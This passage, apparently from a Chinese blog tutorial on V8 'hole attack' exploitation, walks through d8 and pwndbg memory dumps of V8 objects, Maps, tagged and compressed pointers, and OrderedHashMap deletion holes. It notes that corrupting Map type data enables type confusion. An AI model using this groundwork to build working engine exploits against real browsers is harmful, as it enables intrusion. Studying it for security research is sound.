<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> args --allow-natives-syntax --shell ./<span class="built_in">exp</span>.js </span><br><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/yhellow/tools/v8/v8/out.gn/x64.release/d8 --allow-natives-syntax</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread <span class="number">0x7f16e408e700</span> (LWP <span class="number">6736</span>)]</span><br><span class="line">[New Thread <span class="number">0x7f16e388d700</span> (LWP <span class="number">6737</span>)]</span><br><span class="line">[New Thread <span class="number">0x7f16e308c700</span> (LWP <span class="number">6738</span>)]</span><br><span class="line">V8 version <span class="number">11.0</span><span class="number">.0</span> (candidate)</span><br></pre></td></tr></table></figure>
<ul>
<li>测试用 JavaScript 代码如下：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">properties, elements</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="built_in">this</span>[i] = <span class="string">`element<span class="subst">$&#123;i&#125;</span>`</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="built_in">this</span>[<span class="string">`property<span class="subst">$&#123;i&#125;</span>`</span>] = <span class="string">`property<span class="subst">$&#123;i&#125;</span>`</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">new</span> Foo(<span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> foo) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`key:<span class="subst">$&#123;key&#125;</span>, value:<span class="subst">$&#123;foo[key]&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>尝试在 GDB 中打印信息</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; <span class="function">function <span class="title">Foo</span><span class="params">(properties, elements)</span> </span>&#123;<span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="keyword">this</span>[i] = `element$&#123;i&#125;`&#125;<span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="keyword">this</span>[`property$&#123;i&#125;`] = `property$&#123;i&#125;`&#125;&#125;</span><br><span class="line">undefined</span><br><span class="line">d8&gt; <span class="keyword">const</span> foo = <span class="keyword">new</span> Foo(<span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(foo);</span><br><span class="line">DebugPrint: <span class="number">0x1dfe0004d74d</span>: [JS_OBJECT_TYPE]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x1dfe0019b715</span> &lt;Map[<span class="number">52</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x1dfe0004d6c9</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1dfe0019b5e5</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x1dfe0004d795</span> &lt;FixedArray[<span class="number">17</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: <span class="number">0x1dfe0004de81</span> &lt;PropertyArray[<span class="number">3</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x1dfe0019b30d</span>: [String] in OldSpace: #property0: <span class="number">0x1dfe0004d8dd</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property0&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">0</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b371</span>: [String] in OldSpace: #property1: <span class="number">0x1dfe0004d945</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property1&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">1</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b3b1</span>: [String] in OldSpace: #property2: <span class="number">0x1dfe0004d99d</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property2&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">2</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b3f1</span>: [String] in OldSpace: #property3: <span class="number">0x1dfe0004da01</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property3&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">3</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b431</span>: [String] in OldSpace: #property4: <span class="number">0x1dfe0004da71</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property4&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">4</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b471</span>: [String] in OldSpace: #property5: <span class="number">0x1dfe0004daed</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property5&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">5</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b4b1</span>: [String] in OldSpace: #property6: <span class="number">0x1dfe0004db75</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property6&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">6</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b5cd</span>: [String] in OldSpace: #property7: <span class="number">0x1dfe0004dc09</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property7&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">7</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b63d</span>: [String] in OldSpace: #property8: <span class="number">0x1dfe0004dce1</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property8&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">8</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b67d</span>: [String] in OldSpace: #property9: <span class="number">0x1dfe0004dd99</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property9&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">9</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b6bd</span>: [String] in OldSpace: #property10: <span class="number">0x1dfe0004ddc9</span> &lt;String[<span class="number">10</span>]: <span class="string">&quot;property10&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">10</span>), location: properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x1dfe0019b6fd</span>: [String] in OldSpace: #property11: <span class="number">0x1dfe0004dead</span> &lt;String[<span class="number">10</span>]: <span class="string">&quot;property11&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">11</span>), location: properties[<span class="number">1</span>]</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x1dfe0004d795</span> &lt;FixedArray[<span class="number">17</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">0x1dfe0004d781</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element0&quot;</span>&gt;</span><br><span class="line">           <span class="number">1</span>: <span class="number">0x1dfe0004d7e1</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element1&quot;</span>&gt;</span><br><span class="line">           <span class="number">2</span>: <span class="number">0x1dfe0004d7f5</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element2&quot;</span>&gt;</span><br><span class="line">           <span class="number">3</span>: <span class="number">0x1dfe0004d809</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element3&quot;</span>&gt;</span><br><span class="line">           <span class="number">4</span>: <span class="number">0x1dfe0004d81d</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element4&quot;</span>&gt;</span><br><span class="line">           <span class="number">5</span>: <span class="number">0x1dfe0004d831</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element5&quot;</span>&gt;</span><br><span class="line">           <span class="number">6</span>: <span class="number">0x1dfe0004d845</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element6&quot;</span>&gt;</span><br><span class="line">           <span class="number">7</span>: <span class="number">0x1dfe0004d859</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element7&quot;</span>&gt;</span><br><span class="line">           <span class="number">8</span>: <span class="number">0x1dfe0004d86d</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element8&quot;</span>&gt;</span><br><span class="line">           <span class="number">9</span>: <span class="number">0x1dfe0004d881</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element9&quot;</span>&gt;</span><br><span class="line">          <span class="number">10</span>: <span class="number">0x1dfe0004d895</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;element10&quot;</span>&gt;</span><br><span class="line">          <span class="number">11</span>: <span class="number">0x1dfe0004d8ad</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;element11&quot;</span>&gt;</span><br><span class="line">       <span class="number">12</span><span class="number">-16</span>: <span class="number">0x1dfe00002459</span> &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="number">0x1dfe0019b715</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: <span class="number">52</span></span><br><span class="line"> - inobject properties: <span class="number">10</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">1</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1dfe0019b6d5</span> &lt;Map[<span class="number">52</span>](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1dfe0019b635</span> &lt;Cell value= <span class="number">0</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">12</span>: <span class="number">0x1dfe0004dde1</span> &lt;DescriptorArray[<span class="number">12</span>]&gt;</span><br><span class="line"> - prototype: <span class="number">0x1dfe0004d6c9</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1dfe0019b5e5</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1dfe0019a005</span> &lt;JSFunction Foo (sfi = <span class="number">0x1dfe00199f45</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1dfe000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">6</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="number">0</span>: <span class="string">&quot;element0&quot;</span>, <span class="number">1</span>: <span class="string">&quot;element1&quot;</span>, <span class="number">2</span>: <span class="string">&quot;element2&quot;</span>, <span class="number">3</span>: <span class="string">&quot;element3&quot;</span>, <span class="number">4</span>: <span class="string">&quot;element4&quot;</span>, <span class="number">5</span>: <span class="string">&quot;element5&quot;</span>, <span class="number">6</span>: <span class="string">&quot;element6&quot;</span>, <span class="number">7</span>: <span class="string">&quot;element7&quot;</span>, <span class="number">8</span>: <span class="string">&quot;element8&quot;</span>, <span class="number">9</span>: <span class="string">&quot;element9&quot;</span>, <span class="number">10</span>: <span class="string">&quot;element10&quot;</span>, <span class="number">11</span>: <span class="string">&quot;element11&quot;</span>, property0: <span class="string">&quot;property0&quot;</span>, property1: <span class="string">&quot;property1&quot;</span>, property2: <span class="string">&quot;property2&quot;</span>, property3: <span class="string">&quot;property3&quot;</span>, property4: <span class="string">&quot;property4&quot;</span>, property5: <span class="string">&quot;property5&quot;</span>, property6: <span class="string">&quot;property6&quot;</span>, property7: <span class="string">&quot;property7&quot;</span>, property8: <span class="string">&quot;property8&quot;</span>, property9: <span class="string">&quot;property9&quot;</span>, property10: <span class="string">&quot;property10&quot;</span>, property11: <span class="string">&quot;property11&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>先打印对象 <code>JS_OBJECT_TYPE</code> 的信息：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>xw <span class="number">0x1dfe0004d74d</span><span class="number">-1</span> <span class="comment">/* JS_OBJECT_TYPE */</span></span><br><span class="line"><span class="number">0x1dfe0004d74c</span>:	<span class="number">0x0019b715</span>	<span class="number">0x0004de81</span>	<span class="number">0x0004d795</span>	<span class="number">0x0004d8dd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前3个数据分别为 <code>map properties elements</code> 的地址低4字节</li>
<li>注意：<ul>
<li>V8 使用了标记指针，因此在打印前需要先把指针还原</li>
<li>V8 使用了指针压缩的技术，仅在内存中存储指针的下部32位，并将基本高32位存储在特定寄存器中</li>
</ul>
</li>
</ul>
<p>指针 <code>properties</code> 和 <code>elements</code> 与 V8 的两种属性有关：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">Foo</span><span class="params">(properties, elements)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="keyword">this</span>[i] = `element$&#123;i&#125;`&#125;</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="keyword">this</span>[`property$&#123;i&#125;`] = `property$&#123;i&#125;`&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个 for 循环定义了 <code>elements</code> 个数组索引属性（Array-indexed Properties） </li>
<li>第二个 for 循环定义了 <code>properties</code> 个命名属性（Named Properties） </li>
</ul>
<p>V8 遍历时一般会先遍历前者，前后两者在底层存储在两个单独的数据结构中，分别用 <code>elements</code> 和 <code>properties</code> 两个指针指向它们</p>
<p><img src="/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/1669786173114.png" alt="1669786173114"> </p>
<ul>
<li>PS：V8 有一种策略，如果命名属性少于等于10个时，命名属性会直接存储到对象本身，而无需先通过 properties 指针查询（直接存储到对象本身的属性被称为对象内属性 In-object Properties）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>xw <span class="number">0x1dfe0004d795</span><span class="number">-1</span> <span class="comment">/* elements */</span></span><br><span class="line"><span class="number">0x1dfe0004d794</span>:	<span class="number">0x00002231</span>	<span class="number">0x00000022</span>	<span class="number">0x0004d781</span>	<span class="number">0x0004d7e1</span></span><br><span class="line"><span class="number">0x1dfe0004d7a4</span>:	<span class="number">0x0004d7f5</span>	<span class="number">0x0004d809</span>	<span class="number">0x0004d81d</span>	<span class="number">0x0004d831</span></span><br></pre></td></tr></table></figure>
<ul>
<li>从第3个指针开始，就是：[<code>element0</code>：<code>element11</code>]</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>xw <span class="number">0x1dfe0004de81</span><span class="number">-1</span> <span class="comment">/* properties */</span></span><br><span class="line"><span class="number">0x1dfe0004de80</span>:	<span class="number">0x00002d19</span>	<span class="number">0x00000006</span>	<span class="number">0x0004ddc9</span>	<span class="number">0x0004dead</span></span><br><span class="line"><span class="number">0x1dfe0004de90</span>:	<span class="number">0x000023e1</span>	<span class="number">0x00002715</span>	<span class="number">0xd12b3982</span>	<span class="number">0x0000000a</span></span><br></pre></td></tr></table></figure>
<ul>
<li>从第3个指针开始，就是：[<code>property10</code>：<code>property11</code>]（前10个都是对象内属性）</li>
</ul>
<p>对象的映射 <code>map</code> 是一种特殊的属性，其中包含以下信息：</p>
<ul>
<li>对象的动态类型，即 <code>String Uint8Array HeapNumber ...</code></li>
<li>对象的大小（以字节为单位）</li>
<li>对象的属性及其存储位置</li>
<li>数组元素的类型，例如未装箱的双精度或标记的指针</li>
<li>对象的原型</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1dfe0019b715</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: <span class="number">52</span></span><br><span class="line"> - inobject properties: <span class="number">10</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">1</span></span><br><span class="line"> - <span class="class"><span class="keyword">enum</span> <span class="title">length</span>:</span> invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1dfe0019b6d5</span> &lt;Map[<span class="number">52</span>](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1dfe0019b635</span> &lt;Cell value= <span class="number">0</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">12</span>: <span class="number">0x1dfe0004dde1</span> &lt;DescriptorArray[<span class="number">12</span>]&gt;</span><br><span class="line"> - prototype: <span class="number">0x1dfe0004d6c9</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1dfe0019b5e5</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1dfe0019a005</span> &lt;JSFunction Foo (sfi = <span class="number">0x1dfe00199f45</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1dfe000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">6</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>Map</code> 将提供属性值在相应区域中的确切位置</li>
</ul>
<p>本质上，映射定义了应如何访问对象：</p>
<ul>
<li>对于对象数组：存储的是每个对象的地址</li>
<li>对于浮点数组：以浮点数形式存储数值</li>
</ul>
<p>如果我们可以修改 <code>Map</code> 中某些变量的数据类型，就可以达到类型混淆的效果</p>
<p><strong>JavaScript Map 对象原理</strong></p>
<p>先随便打印一个 <code>Map</code> 的内存信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(m)</span><br><span class="line">DebugPrint: <span class="number">0x21100004b9d1</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x2110001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x211000186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x211000186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x211000002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x21100004b9e1</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x211000002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"><span class="number">0x2110001862f1</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_MAP_TYPE</span><br><span class="line"> - instance size: <span class="number">16</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x2110000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x2110001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">0</span>: <span class="number">0x2110000021ed</span> &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: <span class="number">0x211000186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x211000186319</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x2110001862bd</span> &lt;JSFunction Map (sfi = <span class="number">0x2110001557b9</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x2110000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[object Map]</span><br></pre></td></tr></table></figure>
<ul>
<li>和对象 JS_OBJECT_TYPE 相比，JSMap 多了一个 <code>table</code> 属性，这个属性是一个 OrderedHashMap 顺序哈希表</li>
</ul>
<p><code>Map</code> 是基于哈希表实现的，但哈希表不提供任何迭代顺序保证，而 ES6 规范要求实现在迭代 <code>Map</code> 时保持插入顺序，因此，“经典”算法不适合 <code>Map</code></p>
<p>V8 使用了确定性哈希表算法（顺序哈希表），以下显示了此算法使用的主要数据结构：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Entry</span> </span>&#123; <span class="comment">/* buckets */</span></span><br><span class="line">    key: any;</span><br><span class="line">    value: any;</span><br><span class="line">    chain: number;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">CloseTable</span> </span>&#123; <span class="comment">/* table */</span></span><br><span class="line">    hashTable: number[];</span><br><span class="line">    dataTable: Entry[];</span><br><span class="line">    nextSlot: number;</span><br><span class="line">    size: number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>CloseTable 接口代表了哈希表，包含：<ul>
<li>hashTable：哈希表数组（大小等于“存储桶”的数量）</li>
<li>dataTable：包含按插入顺序排列的条目</li>
</ul>
</li>
<li>Entry 接口代表“存储桶”<ul>
<li>key/value：键值对</li>
<li>chain：链属性（指向存储 Entry 的下一个条目）</li>
<li>nextSlot：用于索引到 dataTable 中</li>
</ul>
</li>
</ul>
<p>具体的操作如下：</p>
<ul>
<li>每次将新条目插入表中时，它都会存储在 nextSlot 索引下的 dataTable 数组中（插入的条目将成为新的尾部）</li>
<li>当一个条目从哈希表 hashTable 中删除时，它也会从数据表 dataTable 中删除，但已删除的条目仍会占用数据表中的空间（用 hole 进行填充）</li>
<li>当一个表充满了条目（包括存在的和已删除的）时，需要用更大（或更小）的大小重新散列（重建）</li>
</ul>
<p>使用这种方法，对 <code>Map</code> 进行迭代只需遍历数据表即可，这保证了迭代的插入顺序要求</p>
<p>测试案例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">map.set(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">map.set(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">map.delete(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>先执行两个 <code>set</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>.<span class="built_in">set</span>(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">set</span>(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">---------------------------------------</span><br><span class="line">pwndbg&gt; job <span class="number">0x1d830004b9d9</span></span><br><span class="line"><span class="number">0x1d830004b9d9</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">2</span> <span class="comment">/* 元素个数 */</span></span><br><span class="line"> - deleted: <span class="number">0</span> <span class="comment">/* 删除个数 */</span></span><br><span class="line"> - buckets: <span class="number">2</span> <span class="comment">/* 已使用的存储桶个数 */</span></span><br><span class="line"> - capacity: <span class="number">4</span> <span class="comment">/* map容量(capacity/2就是当前可以容纳的最大bucket数目) */</span></span><br><span class="line"> - buckets: &#123; <span class="comment">/* 存储桶 */</span></span><br><span class="line">              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123; <span class="comment">/* 元素 */</span></span><br><span class="line">              <span class="number">0</span>: <span class="number">1</span> -&gt; <span class="number">0x1d830000407d</span> &lt;String[<span class="number">1</span>]: <span class="meta">#a&gt;</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">2</span> -&gt; <span class="number">0x1d830000408d</span> &lt;String[<span class="number">1</span>]: <span class="meta">#b&gt;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后执行一个 <code>delete</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>.<span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">---------------------------------------</span><br><span class="line">pwndbg&gt; job <span class="number">0x1d830004b9d9</span></span><br><span class="line"><span class="number">0x1d830004b9d9</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">1</span></span><br><span class="line"> - deleted: <span class="number">1</span></span><br><span class="line"> - buckets: <span class="number">2</span></span><br><span class="line"> - capacity: <span class="number">4</span> </span><br><span class="line"> - buckets: &#123;  <span class="comment">/* 存储桶不减少 */</span></span><br><span class="line">              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123; <span class="comment">/* 元素减少 */</span></span><br><span class="line">              <span 